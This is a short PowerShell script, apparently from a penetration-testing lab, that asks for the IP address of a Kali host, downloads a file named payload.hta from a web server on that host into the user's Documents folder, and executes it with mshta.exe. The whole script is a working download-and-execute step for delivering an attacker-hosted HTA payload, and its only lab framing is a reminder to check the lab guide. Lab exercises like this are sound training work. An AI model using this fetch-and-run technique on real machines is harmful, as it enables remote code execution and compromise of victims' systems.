$ipaddr = Read-Host -Prompt 'What is the IP address of your Kali host?'
echo '[+] Have you started the pyhton web server? Check the lab guide if you have not'
$url = "http://"+$ipaddr+":8080/payload.hta"
$Username = $env:USERNAME
$filepath = "C:\Users\"+$Username+"\Documents\payload.hta"
(new-object net.webclient).downloadfile($url,$filepath)

C:\Windows\system32\mshta.exe $filepath